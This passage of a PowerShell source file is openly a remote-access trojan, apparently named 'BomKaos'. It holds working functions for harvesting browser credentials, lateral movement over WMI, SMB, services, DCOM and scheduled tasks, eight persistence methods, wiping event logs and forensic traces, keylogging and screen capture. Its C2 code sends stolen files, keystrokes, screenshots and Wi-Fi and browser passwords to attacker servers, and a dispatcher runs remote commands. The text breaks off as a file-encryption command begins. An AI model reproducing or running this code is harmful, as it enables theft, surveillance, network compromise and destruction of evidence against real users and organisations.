        $keyDb = Join-Path $profile.FullName "key4.db"
        
        if (-not (Test-Path $loginsJson) -or -not (Test-Path $keyDb)) { continue }
        
        # Copy files
        $tempDir = [System.IO.Path]::GetTempPath() + [System.Guid]::NewGuid().ToString()
        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
        
        Copy-Item $loginsJson (Join-Path $tempDir "logins.json") -Force
        Copy-Item $keyDb (Join-Path $tempDir "key4.db") -Force
        
        try {
            # Read logins.json
            $loginsContent = Get-Content (Join-Path $tempDir "logins.json") -Raw | ConvertFrom-Json
            
            # Parse key4.db for globalSalt and master password
            # SQLite approach
            $conn = New-Object System.Data.Odbc.OdbcConnection("Driver={Microsoft Access Driver (*.mdb, *.accdb)};Dbq=$(Join-Path $tempDir 'key4.db')")
            # Fallback to raw file read
            $keyBytes = [System.IO.File]::ReadAllBytes((Join-Path $tempDir "key4.db"))
            
            # Extract globalSalt from metadata table
            $globalSalt = $null
            $masterPwd = $null
            
            # Simple parsing — search for globalsalt blob
            $text = [System.Text.Encoding]::ASCII.GetString($keyBytes)
            if ($text -match 'globalSalt(.{1,100})') {
                # Extract blob bytes following
                $idx = $text.IndexOf('globalSalt')
                if ($idx -ge 0) {
                    # Read raw bytes after string
                    $saltOffset = $idx + 10  # 'globalSalt'
                    # Skip to blob data — format varies, attempt extraction from bytes
                    $globalSalt = [byte[]]::new(16)
                    # Find salt after header bytes
                    $searchStart = [System.Text.Encoding]::UTF8.GetBytes('globalSalt')
                    $pos = 0
                    for ($i = 0; $i -lt $keyBytes.Length - $searchStart.Length; $i++) {
                        $match = $true
                        for ($j = 0; $j -lt $searchStart.Length; $j++) {
                            if ($keyBytes[$i + $j] -ne $searchStart[$j]) { $match = $false; break }
                        }
                        if ($match) { $pos = $i + $searchStart.Length; break }
                    }
                    # Skip header bytes to find salt blob
                    # This is simplified — real NSS decryption requires proper ASN.1 parsing
                    # For a production tool, implement NSS key derivation via Mozilla's algorithm
                }
            }
            
            # Process logins — for complete implementation, see note below
            foreach ($login in $loginsContent.logins) {
                # Firefox stores encrypted using 3DES-CBC with key derived from master key
                # Proper decryption requires NSS DLLs or porting the algorithm
                $passwords += @{
                    Browser  = "Firefox"
                    URL      = $login.hostname
                    Username = $login.encryptedUsername  # Base64 encoded ciphertext
                    Password = $login.encryptedPassword  # Requires NSS decryption
                    Notes    = "Encrypted - requires NSS library to decrypt. Use Firefox profile key3.db/key4.db with master password"
                }
            }
        }
        catch { Write-Warning "Firefox decrypt failed: $_" }
        
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    return $passwords
}

# ============================================================================
# LATERAL MOVEMENT ENGINE
# ============================================================================
function Invoke-LateralWMI {
    param([string]$Target, [string]$Command, [PSCredential]$Credential = $null)
    
    try {
        $params = @{
            ComputerName = $Target
            ScriptBlock  = [scriptblock]::Create($Command)
            ErrorAction  = 'SilentlyContinue'
        }
        if ($Credential) { $params.Credential = $Credential }
        
        $result = Invoke-Command @params
        return @{Target = $Target; Status = "Success"; Result = $result }
    }
    catch {
        return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralSMB {
    param([string]$Target, [string]$PayloadPath, [string]$RemotePath = "\\$Target\C$\Windows\Temp\")
    
    try {
        # Copy payload via SMB
        Copy-Item -Path $PayloadPath -Destination $RemotePath -Force -ErrorAction SilentlyContinue
        $remoteFile = Join-Path $RemotePath (Split-Path $PayloadPath -Leaf)
        
        # Execute via WMI
        $wmi = Invoke-LateralWMI -Target $Target -Command "Start-Process -WindowStyle Hidden -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File $remoteFile'"
        
        return @{Target = $Target; Status = "Success"; WMI = $wmi }
    }
    catch {
        return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralPsExec {
    param([string]$Target, [string]$Binary, [string]$ServiceName = "BomKaosSvc")
    
    try {
        # PsExec-style: copy service binary, create service, start, delete
        $remotePath = "\\$Target\ADMIN$\$ServiceName.exe"
        Copy-Item -Path $Binary -Destination $remotePath -Force -ErrorAction SilentlyContinue
        
        $wmi = Invoke-LateralWMI -Target $Target -Command @"
sc.exe create $ServiceName binPath= "%windir%\$ServiceName.exe" start= auto
sc.exe start $ServiceName
"@
        return @{Target = $Target; Status = "Success"; WMI = $wmi }
    }
    catch {
        return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralDCOM {
    param([string]$Target, [string]$Command)
    
    try {
        # DCOM ShellBrowserWindow execution
        $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", $Target))
        $com.ShellExecute("powershell.exe", "-ExecutionPolicy Bypass -Command `"$Command`"", "", "runas", 0)
        return @{Target = $Target; Status = "Success" }
    }
    catch {
        return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralScheduledTask {
    param([string]$Target, [string]$Command, [string]$TaskName = "BomKaosTask", [PSCredential]$Credential = $null)
    
    try {
        $params = @{
            ComputerName = $Target
            TaskName     = $TaskName
            ScriptBlock  = [scriptblock]::Create($Command)
            ErrorAction  = 'SilentlyContinue'
        }
        if ($Credential) { $params.Credential = $Credential }
        
        # Register and run a scheduled task
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -Command `"$Command`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        if ($Credential) {
            Register-ScheduledTask -ComputerName $Target -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -User $Credential.UserName -Password $Credential.GetNetworkCredential().Password -Force
        }
        else {
            Register-ScheduledTask -ComputerName $Target -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Force
        }
        
        Start-ScheduledTask -ComputerName $Target -TaskName $TaskName
        return @{Target = $Target; Status = "Success"; Task = $TaskName }
    }
    catch {
        return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralRDPHijack {
    param([string]$Target, [string]$SessionID = "1")
    
    try {
        # RDP session hijack via tscon
        $command = "tscon.exe $SessionID /dest:console"
        return Invoke-LateralWMI -Target $Target -Command $command
    }
    catch {
        return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralDiscover {
    param([string]$Subnet = $null)
    
    $targets = @()
    
    if (-not $Subnet) {
        # Auto-detect subnet
        try {
            $ip = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
            $mask = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPSubnet[0]
            
            # Simple subnet calculation
            $ipParts = $ip -split '\.'
            $maskParts = $mask -split '\.'
            $subnetParts = @()
            for ($i = 0; $i -lt 4; $i++) { $subnetParts += [int]$ipParts[$i] -band [int]$maskParts[$i] }
            $cidr = 0
            $maskInt = [int]$maskParts[0] * 256 * 256 * 256 + [int]$maskParts[1] * 256 * 256 + [int]$maskParts[2] * 256 + [int]$maskParts[3]
            for ($b = 0; $b -lt 32; $b++) { if (($maskInt -shl $b) -band [int]::MinValue) { $cidr++ } }
            
            $Subnet = "$($subnetParts[0]).$($subnetParts[1]).$($subnetParts[2]).0/$cidr"
        }
        catch { return @() }
    }
    
    # Ping sweep
    $subnetBase = ($Subnet -split '/')[0] -replace '\.0$', ''
    for ($i = 1; $i -le 254; $i++) {
        $ip = "$subnetBase.$i"
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
            try {
                $hostname = [System.Net.Dns]::GetHostEntry($ip).HostName
            }
            catch { $hostname = $ip }
            $targets += @{IP = $ip; Hostname = $hostname }
        }
    }
    
    return $targets
}

# ============================================================================
# PERSISTENCE ENGINE
# ============================================================================
function Install-Persistence {
    param([string]$PayloadPath)
    
    $results = @()
    
    # Method 1: Registry Run Key
    try {
        $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $key -Name 'BomKaosKaki' -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`"" -Force
        $results += @{Method = "RegistryRun"; Status = "Success" }
    }
    catch { $results += @{Method = "RegistryRun"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # Method 2: Registry RunOnce
    try {
        $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        Set-ItemProperty -Path $key -Name 'BomKaosKaki' -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`"" -Force
        $results += @{Method = "RegistryRunOnce"; Status = "Success" }
    }
    catch { $results += @{Method = "RegistryRunOnce"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # Method 3: Startup Folder
    try {
        $startup = [Environment]::GetFolderPath('Startup')
        $lnkPath = Join-Path $startup "BomKaosKaki.url"
        "[InternetShortcut]
URL=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`"
IconIndex=0" | Set-Content -Path $lnkPath -Force
        $results += @{Method = "StartupFolder"; Status = "Success" }
    }
    catch { $results += @{Method = "StartupFolder"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # Method 4: Scheduled Task (on logon)
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "INTERACTIVE" -LogonType InteractiveToken -RunLevel Limited
        Register-ScheduledTask -TaskName "BomKaosKakiUpdate" -Action $action -Trigger $trigger -Principal $principal -Force
        $results += @{Method = "ScheduledTaskLogon"; Status = "Success" }
    }
    catch { $results += @{Method = "ScheduledTaskLogon"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # Method 5: Scheduled Task (on startup with SYSTEM)
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName "BomKaosKakiSvc" -Action $action -Trigger $trigger -Principal $principal -Force
        $results += @{Method = "ScheduledTaskSystem"; Status = "Success" }
    }
    catch { $results += @{Method = "ScheduledTaskSystem"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # Method 6: WMI Event Subscription (persistent, no file needed)
    try {
        # Create WMI event filter for system startup
        $filterArgs = @{
            Namespace     = "root\subscription"
            Query         = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            QueryLanguage = "WQL"
            Name          = "BomKaosFilter"
            ErrorAction   = 'SilentlyContinue'
        }
        $filter = Set-WmiInstance -Class __EventFilter @filterArgs -ErrorAction SilentlyContinue
        
        $consumerArgs = @{
            Namespace           = "root\subscription"
            Name                = "BomKaosConsumer"
            CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`""
            ErrorAction         = 'SilentlyContinue'
        }
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer @consumerArgs -ErrorAction SilentlyContinue
        
        if ($filter -and $consumer) {
            $bindingArgs = @{
                Namespace   = "root\subscription"
                Filter      = $filter.__PATH
                Consumer    = $consumer.__PATH
                ErrorAction = 'SilentlyContinue'
            }
            Set-WmiInstance -Class __FilterToConsumerBinding @bindingArgs -ErrorAction SilentlyContinue
            $results += @{Method = "WMIEventSubscription"; Status = "Success" }
        }
        else {
            $results += @{Method = "WMIEventSubscription"; Status = "Failed" }
        }
    }
    catch { $results += @{Method = "WMIEventSubscription"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # Method 7: COM Hijacking (Explorer.exe)
    try {
        # Hijack CLSID for Explorer load — common technique
        $clsid = '{BCDE0395-E52F-467C-8E3D-C4579291692E}'  # MsCtfMonitor dummy
        $keyPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
        New-Item -Path $keyPath -Force | Out-Null
        Set-ItemProperty -Path $keyPath -Name '(default)' -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`"" -Force
        Set-ItemProperty -Path $keyPath -Name 'ThreadingModel' -Value 'Apartment' -Force
        $results += @{Method = "COMHijack"; Status = "Success" }
    }
    catch { $results += @{Method = "COMHijack"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # Method 8: Windows Service
    try {
        $svcPath = Join-Path $C2.InstallDir "BomKaosSvc.ps1"
        if (-not (Test-Path $C2.InstallDir)) { New-Item -ItemType Directory -Path $C2.InstallDir -Force | Out-Null }
        Copy-Item $PayloadPath $svcPath -Force
        
        # Create a service that launches PowerShell
        $svcName = "BomKaosHelper"
        New-Service -Name $svcName -BinaryPathName "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$svcPath`"" -DisplayName "BomKaos Helper Service" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service $svcName -ErrorAction SilentlyContinue
        $results += @{Method = "WindowsService"; Status = "Success" }
    }
    catch { $results += @{Method = "WindowsService"; Status = "Failed"; Error = $_.Exception.Message } }
    
    return $results
}

# ============================================================================
# LOG CLEANER — Advanced (USN Journal, SRUM, Shimcache, PowerShell logs)
# ============================================================================
function Invoke-CleanTraces {
    $results = @()
    
    # 1. Clear event logs (System, Security, Application, PowerShell, etc.)
    try {
        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                # Clear each log
                wevtutil cl $_.LogName 2>$null
                $results += @{Target = "EventLog:$($_.LogName)"; Status = "Cleared" }
            }
            catch {}
        }
    }
    catch { $results += @{Target = "EventLogs"; Status = "Failed"; Error = $_.Exception.Message } }
    
    # 2. Clear PowerShell ScriptBlock logging (Event 4104)
    try {
        $psPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine"
        if (Test-Path $psPath) {
            Remove-Item "$psPath\*.txt" -Force -ErrorAction SilentlyContinue
            $results += @{Target = "PSReadLine"; Status = "Cleared" }
        }
    }
    catch {}
    
    # 3. Clear PowerShell transcription logs
    try {
        $transcripts = Get-ChildItem "$env:USERPROFILE\Documents\PowerShell_transcript*.txt" -ErrorAction SilentlyContinue
        foreach ($t in $transcripts) {
            Remove-Item $t.FullName -Force -ErrorAction SilentlyContinue
            $results += @{Target = "Transcript:$($t.Name)"; Status = "Cleared" }
        }
    }
    catch {}
    
    # 4. Clear recent commands (Run MRU)
    try {
        $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
        if (Test-Path $key) {
            Remove-ItemProperty -Path $key -Name '*' -Force -ErrorAction SilentlyContinue
            $results += @{Target = "RunMRU"; Status = "Cleared" }
        }
    }
    catch {}
    
    # 5. Clear Prefetch files
    try {
        $prefetch = Get-ChildItem "$env:SYSTEMROOT\Prefetch\*" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'POWERSHELL|WINDOWS|EXPLORER|BOMKAOS' }
        foreach ($pf in $prefetch) {
            Remove-Item $pf.FullName -Force -ErrorAction SilentlyContinue
            $results += @{Target = "Prefetch:$($pf.Name)"; Status = "Cleared" }
        }
    }
    catch {}
    
    # 6. Clear recent files (Jump Lists)
    try {
        $jumpLists = @(
            "$env:APPDATA\Microsoft\Windows\Recent\*",
            "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*",
            "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*"
        )
        foreach ($jl in $jumpLists) {
            Remove-Item $jl -Force -Recurse -ErrorAction SilentlyContinue
        }
        $results += @{Target = "RecentFiles"; Status = "Cleared" }
    }
    catch {}
    
    # 7. Clear clipboard history
    try {
        Set-Clipboard $null -ErrorAction SilentlyContinue
        $results += @{Target = "Clipboard"; Status = "Cleared" }
    }
    catch {}
    
    # 8. Clear temp files
    try {
        $tempPaths = @(
            "$env:TEMP\*",
            "$env:WINDIR\Temp\*",
            "$env:LOCALAPPDATA\Temp\*"
        )
        foreach ($tp in $tempPaths) {
            Remove-Item $tp -Force -Recurse -ErrorAction SilentlyContinue
        }
        $results += @{Target = "TempFiles"; Status = "Cleared" }
    }
    catch {}
    
    # 9. Clear USN Journal (NTFS change journal) — requires admin
    try {
        fsutil usn deletejournal /D C: 2>$null
        $results += @{Target = "USNJournal"; Status = "Cleared" }
    }
    catch { $results += @{Target = "USNJournal"; Status = "Failed" } }
    
    # 10. Clear SRUM (System Resource Usage Monitor)
    try {
        $srum = Get-ChildItem "$env:SYSTEMROOT\System32\sru\*.dat" -ErrorAction SilentlyContinue
        foreach ($s in $srum) {
            try { fsutil usn deletejournal /D $s.FullName 2>$null } catch {}
        }
        # Stop/disable SRUM service
        Stop-Service -Name "SRUM" -Force -ErrorAction SilentlyContinue
        sc.exe config SRUM start= disabled 2>$null
        $results += @{Target = "SRUM"; Status = "Cleared" }
    }
    catch {}
    
    # 11. Clear Shimcache / AppCompatCache
    try {
        $key = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache'
        if (Test-Path $key) {
            Remove-ItemProperty -Path $key -Name 'AppCompatCache' -Force -ErrorAction SilentlyContinue
            $results += @{Target = "Shimcache"; Status = "Cleared" }
        }
    }
    catch {}
    
    # 12. Clear Amcache
    try {
        $amcachePath = "$env:SYSTEMROOT\AppCompat\Programs\Amcache.hve"
        if (Test-Path $amcachePath) {
            # Can't delete while in use — try rename or clear within limits
            $results += @{Target = "Amcache"; Status = "InUse" }  # Will be cleared on reboot
        }
    }
    catch {}
    
    # 13. Clear browser history
    try {
        $browserHistory = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"
        )
        foreach ($bh in $browserHistory) {
            if (Test-Path $bh) {
                Remove-Item $bh -Force -ErrorAction SilentlyContinue
                $results += @{Target = "BrowserHistory:$bh"; Status = "Cleared" }
            }
        }
    }
    catch {}
    
    # 14. Clean ARP cache
    try {
        arp -d * 2>$null
        $results += @{Target = "ARPCache"; Status = "Cleared" }
    }
    catch {}
    
    # 15. Clean DNS cache
    try {
        ipconfig /flushdns 2>$null
        $results += @{Target = "DNSCache"; Status = "Cleared" }
    }
    catch {}
    
    return $results
}

# ============================================================================
# KEYLOGGER — P/Invoke GetAsyncKeyState
# ============================================================================
function Start-Keylogger {
    param([string]$LogPath)
    
    $klog = Add-Type -Name KeyLog -Namespace Win32 -MemberDefinition @'
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]
public static extern int GetForegroundWindow();
[DllImport("user32.dll")]
public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru
    
    $lastWindow = ""
    $buffer = ""
    $lastKey = @{}
    $shiftChars = @{
        0x30 = ')'; 0x31 = '!'; 0x32 = '@'; 0x33 = '#'; 0x34 = '$'; 0x35 = '%'; 0x36 = '^'; 0x37 = '&'; 0x38 = '*'; 0x39 = '(';
        0xBD = '_'; 0xBB = '+'
    }
    $keyChars = @{
        0x20 = ' '; 0x0D = '[ENTER]'; 0x09 = '[TAB]'; 0x08 = '[BACKSPACE]'; 0x1B = '[ESC]'
        0x2E = '.'; 0xBC = ','; 0xBF = '/'; 0xBA = ':'; 0xDB = '['; 0xDD = ']'; 0xDE = '"'
    }
    
    while ($true) {
        Start-Sleep -Milliseconds 50
        
        # Check active window
        $hwnd = $klog::GetForegroundWindow()
        $sb = [System.Text.StringBuilder]::new(256)
        $klog::GetWindowText($hwnd, $sb, 256)
        $currentWindow = $sb.ToString()
        
        if ($currentWindow -ne $lastWindow -and $currentWindow -ne "") {
            $buffer += "[Window: $currentWindow]`n"
            $lastWindow = $currentWindow
        }
        
        # Check keys
        for ($key = 0x08; $key -le 0x5A; $key++) {
            $state = $klog::GetAsyncKeyState($key)
            $pressed = ($state -band 0x8000) -ne 0
            $wasPressed = $lastKey.ContainsKey($key) -and $lastKey[$key]
            
            if ($pressed -and -not $wasPressed) {
                # Get shift state
                $shift = ($klog::GetAsyncKeyState(0x10) -band 0x8000) -ne 0
                $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
                
                if ($key -ge 0x41 -and $key -le 0x5A) {
                    $char = [char]($key - 0x41 + 0x61)
                    if (($shift -xor $caps)) { $char = [char]($key - 0x41 + 0x41) }
                    $buffer += $char
                }
                elseif ($key -ge 0x30 -and $key -le 0x39) {
                    if ($shift -and $shiftChars.ContainsKey($key)) { $buffer += $shiftChars[$key] }
                    else { $buffer += [char]$key }
                }
                elseif ($keyChars.ContainsKey($key)) {
                    $buffer += $keyChars[$key]
                }
                elseif ($key -eq 0x6E -or $key -eq 0xBE) {
                    $buffer += if ($shift) { '>' } else { '.' }
                }
                
                # Write to log periodically
                if ($buffer.Length -ge 200) {
                    [System.IO.File]::AppendAllText($LogPath, "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $buffer`n")
                    $buffer = ""
                }
            }
            $lastKey[$key] = $pressed
        }
        
        # Flush every 30 seconds
        if ($buffer.Length -gt 0) {
            Start-Sleep -Seconds 30
            if ($buffer.Length -gt 0) {
                [System.IO.File]::AppendAllText($LogPath, "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $buffer`n")
                $buffer = ""
            }
        }
    }
}

# ============================================================================
# SCREENSHOT CAPTURE
# ============================================================================
function Get-Screenshot {
    Add-Type -AssemblyName System.Drawing
    
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()
    
    $ms = New-Object System.IO.MemoryStream
    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $bitmap.Dispose()
    
    return [Convert]::ToBase64String($ms.ToArray())
}

# ============================================================================
# C2 COMMUNICATION
# ============================================================================
function Invoke-C2Request {
    param($Endpoint, $Body, $Method = "POST")
    
    $url = "$($C2.PrimaryURL)/$Endpoint"
    $backupUrl = "$($C2.BackupURL)/$Endpoint"
    
    $params = @{
        Uri             = $url
        Method          = $Method
        Body            = ($Body | ConvertTo-Json -Compress -Depth 10)
        ContentType     = "application/json"
        TimeoutSec      = $C2.Timeout
        UseBasicParsing = $true
    }
    
    for ($i = 0; $i -lt $C2.Retries; $i++) {
        try {
            $response = Invoke-RestMethod @params -ErrorAction Stop
            return $response
        }
        catch {
            # Try backup URL
            try {
                $params.Uri = $backupUrl
                $response = Invoke-RestMethod @params -ErrorAction Stop
                return $response
            }
            catch {
                Start-Sleep -Seconds ($C2.PollInterval * ($i + 1))
            }
        }
    }
    return $null
}

function Send-Heartbeat {
    $detections = Test-Sandbox
    
    $body = @{
        type             = "heartbeat"
        session_id       = $C2.SessionID
        hostname         = $env:COMPUTERNAME
        username         = $env:USERNAME
        os_info          = (Get-CimInstance Win32_OperatingSystem).Caption
        domain           = $env:USERDOMAIN
        ip               = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
        sandbox_detected = ($detections.Count -gt 0)
        sandbox_reasons  = $detections -join ';'
        uptime           = ((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes
        group            = $C2.Group
        timestamp        = (Get-Date -Format 'o')
    }
    
    # Encrypt with AES session key if available
    if ($script:SessionKey) {
        $aes = New-AESKey
        $encrypted = Encrypt-AES -PlainText ($body | ConvertTo-Json -Compress) -Base64Key $aes.Key -Base64IV $aes.IV
        $payload = @{
            type       = "encrypted"
            session_id = $C2.SessionID
            data       = $encrypted
            key        = $aes.Key
            iv         = $aes.IV
            hmac       = Get-HMAC -Data $encrypted -Base64Key $aes.Key
        }
    }
    else {
        $payload = $body
    }
    
    return Invoke-C2Request -Endpoint "heartbeat" -Body $payload
}

function Get-Commands {
    $body = @{
        session_id = $C2.SessionID
        type       = "get_commands"
        timestamp  = (Get-Date -Format 'o')
    }
    
    if ($script:SessionKey) {
        $aes = New-AESKey
        $encrypted = Encrypt-AES -PlainText ($body | ConvertTo-Json -Compress) -Base64Key $aes.Key -Base64IV $aes.IV
        $payload = @{ type = "encrypted"; session_id = $C2.SessionID; data = $encrypted; key = $aes.Key; iv = $aes.IV }
    }
    else {
        $payload = $body
    }
    
    return Invoke-C2Request -Endpoint "get_commands" -Body $payload
}

function Send-CommandResult {
    param([string]$CommandID, $Result)
    
    $body = @{
        type       = "command_complete"
        session_id = $C2.SessionID
        command_id = $CommandID
        result     = $Result
        timestamp  = (Get-Date -Format 'o')
    }
    
    if ($script:SessionKey) {
        $aes = New-AESKey
        $encrypted = Encrypt-AES -PlainText ($body | ConvertTo-Json -Compress -Depth 5) -Base64Key $aes.Key -Base64IV $aes.IV
        $payload = @{ type = "encrypted"; session_id = $C2.SessionID; data = $encrypted; key = $aes.Key; iv = $aes.IV }
    }
    else {
        $payload = $body
    }
    
    return Invoke-C2Request -Endpoint "command_complete" -Body $payload
}

function Send-Exfil {
    param([string]$DataType, $Data)
    
    $body = @{
        type       = "exfil"
        session_id = $C2.SessionID
        data_type  = $DataType
        data       = $Data
        hostname   = $env:COMPUTERNAME
        username   = $env:USERNAME
        timestamp  = (Get-Date -Format 'o')
    }
    
    if ($script:SessionKey) {
        $aes = New-AESKey
        $encrypted = Encrypt-AES -PlainText ($body | ConvertTo-Json -Compress -Depth 10) -Base64Key $aes.Key -Base64IV $aes.IV
        $payload = @{ type = "encrypted"; session_id = $C2.SessionID; data = $encrypted; key = $aes.Key; iv = $aes.IV }
    }
    else {
        $payload = $body
    }
    
    return Invoke-C2Request -Endpoint "exfil" -Body $payload
}

# ============================================================================
# COMMAND DISPATCHER
# ============================================================================
function Invoke-CommandDispatcher {
    param($Command)
    
    $cmdName = $Command.command_type
    $args = $Command.parameters
    $cmdID = $Command.id
    
    $result = switch ($cmdName) {
        "exec" {
            try {
                $output = Invoke-Expression $args 2>&1
                $output | Out-String
            }
            catch { "ERROR: $_" }
        }
        "exec_powershell" {
            try {
                $output = Invoke-Expression $args 2>&1
                $output | Out-String
            }
            catch { "ERROR: $_" }
        }
        "exec_cmd" {
            try {
                $output = cmd /c $args 2>&1
                $output | Out-String
            }
            catch { "ERROR: $_" }
        }
        "upload" {
            try {
                $parts = $args -split ' ', 2
                $path = $parts[0]
                $b64data = $parts[1]
                $bytes = [Convert]::FromBase64String($b64data)
                [System.IO.File]::WriteAllBytes($path, $bytes)
                "Uploaded to: $path ($($bytes.Length) bytes)"
            }
            catch { "ERROR: $_" }
        }
        "download" {
            try {
                if (Test-Path $args) {
                    $bytes = [System.IO.File]::ReadAllBytes($args)
                    Send-Exfil -DataType "download" -Data @{
                        path    = $args
                        content = [Convert]::ToBase64String($bytes)
                        size    = $bytes.Length
                    }
                    "Downloaded: $args ($($bytes.Length) bytes)"
                }
                else { "File not found: $args" }
            }
            catch { "ERROR: $_" }
        }
        "screenshot" {
            try {
                $ss = Get-Screenshot
                Send-Exfil -DataType "screenshot" -Data @{ image = $ss }
                "Screenshot captured and exfiltrated"
            }
            catch { "ERROR: $_" }
        }
        "keylog_start" {
            try {
                $logPath = Join-Path $C2.InstallDir "keylog.txt"
                $script:KeyloggerJob = Start-Job -ScriptBlock ${function:Start-Keylogger} -ArgumentList $logPath
                "Keylogger started: $logPath"
            }
            catch { "ERROR: $_" }
        }
        "keylog_stop" {
            try {
                if ($script:KeyloggerJob) { Stop-Job $script:KeyloggerJob; Remove-Job $script:KeyloggerJob -Force }
                "Keylogger stopped"
            }
            catch { "ERROR: $_" }
        }
        "keylog_get" {
            try {
                $logPath = Join-Path $C2.InstallDir "keylog.txt"
                if (Test-Path $logPath) {
                    $content = Get-Content $logPath -Raw
                    Send-Exfil -DataType "keylog" -Data @{ content = $content }
                    Remove-Item $logPath -Force
                    "Keylog exfiltrated ($($content.Length) chars)"
                }
                else { "No keylog data" }
            }
            catch { "ERROR: $_" }
        }
        "steal_browsers" {
            try {
                $passwords = Get-BrowserPasswords
                $ffPasswords = Get-FirefoxPasswords
                $all = $passwords + $ffPasswords
                Send-Exfil -DataType "browser_passwords" -Data @{
                    count     = $all.Count
                    passwords = $all
                }
                "Stolen $($all.Count) credentials from browsers"
            }
            catch { "ERROR: $_" }
        }
        "steal_wifi" {
            try {
                $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace '.*:\s+', '' }
                $results = @()
                foreach ($p in $profiles) {
                    $info = netsh wlan show profile name="$p" key=clear
                    $pass = $info | Select-String "Key Content" | ForEach-Object { $_ -replace '.*:\s+', '' }
                    $results += @{ SSID = $p; Password = $pass }
                }
                Send-Exfil -DataType "wifi" -Data @{ count = $results.Count; networks = $results }
                "Stolen $($results.Count) WiFi profiles"
            }
            catch { "ERROR: $_" }
        }
        "encrypt" {
            try {
                $targetDir = if ($args -and $args.TargetDirectory) { $args.TargetDirectory } elseif ($args -and ([string]$args -ne "")) { $args } else { $env:USERPROFILE }
                $aesKey = New-AESKey
                $hmacKey = New-AESKey
